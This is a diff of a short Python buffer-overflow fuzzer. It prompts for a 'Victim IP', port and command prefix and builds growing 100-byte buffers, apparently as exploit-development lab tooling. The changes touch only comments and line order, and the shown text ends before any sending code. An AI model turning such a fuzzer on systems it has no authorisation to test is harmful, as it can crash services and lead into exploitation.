@@ -2,13 +2,12 @@
 #!/usr/bin/env python3
 #BOF Fuzzer Modified
 import socket, time, sys
-#change this
+#Be certain when inputting you use " " double quotes around the ip as a string and not an messed up float.
 ip = input("Victim IP:")
-#change this
 port = input("Port:")
-timeout = 5
 prefix = input("Enter Command:")
-#appends 100 A's to the end of the command each loop
+timeout = 5
+#appends 100 bytes to the end of the command each loop
 buffer = []
 bytes = 100
 while len(buffer) < 30:
